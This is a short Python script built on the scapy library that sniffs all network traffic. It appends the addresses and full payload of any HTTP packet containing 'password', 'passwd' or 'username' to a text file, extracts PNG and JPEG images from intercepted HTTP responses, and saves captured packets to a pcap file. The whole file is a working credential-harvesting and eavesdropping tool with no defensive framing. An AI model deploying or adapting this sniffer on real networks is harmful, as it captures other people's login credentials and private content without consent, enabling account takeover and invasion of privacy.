from scapy.all import *
import time
from scapy.utils import PcapReader, PcapWriter
#sniff(filter="",iface='any',prn=function,count=N)

def getHttpHeaders(http_payload):
    try:
        headers=dict(re.findall(r'\r\n([A-Za-z]{2,}.*?\w): (.*?)\r\n',http_payload))
        if headers=={}:
            return None
    except:
        return None
    return headers

def getUser(packet):
    f=open('userdata.txt','a')
    f.write("[*]Dst:{}".format(packet[IP].dst)+'\n')
    f.write('[*]Src:%s'%packet[IP].src+'\n')
    f.write("[*]Data:{}".format(packet[IP].payload)+'\n\n\n')
    f.close()

def getImage(packet,headers):
    data=packet.payload
    data=bytes(data)
    image_type=headers['Content-Type'].split('/')[1]
    startindex=None
    endindex=None
    image=None
    if image_type=='png' or image_type=='PNG':
        for index in range(len(data)):
            if data[index]==0x89 and data[index+1]==0x50 and data[index+2]==0x4e and data[index+3]==0x47:
                startindex=index
        image=data[startindex:]
    if image_type=='jpeg':
        for index in range(len(data)):
            if data[index]==0xff and data[index+1]==0xd8:
                startindex=index
            if data[index]==0xff and data[index+1]==0xd9:
                endindex=index+1
        try:
            image=data[startindex:endindex]
        except:
            image=data[startindex:]
    if image==None:
        return
    imgname=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time()))
    img=open('images/%s.%s'%(imgname,image_type),'wb')
    img.write(image)
    img.close()

def packet_callback(packet):
    try:
        statue=packet[TCP].load
    except:
        return
    data=packet[TCP].load.decode('utf-8','ignore')
    headers=getHttpHeaders(data)
    if headers==None:
        return
    passwd_packet=str(packet[TCP].payload)
    if  'password' in passwd_packet.lower() or 'passwd' in passwd_packet.lower() or 'username' in passwd_packet.lower():
        getUser(packet)
    try:
        if 'image' in headers['Content-Type']:
            getImage(packet,headers)
    except:
        pass
    writer=PcapWriter('data.pcap', append = True)
    writer.write(packet)
    writer.flush()
    writer.close()

sniff(filter='',prn=packet_callback,count=100000)
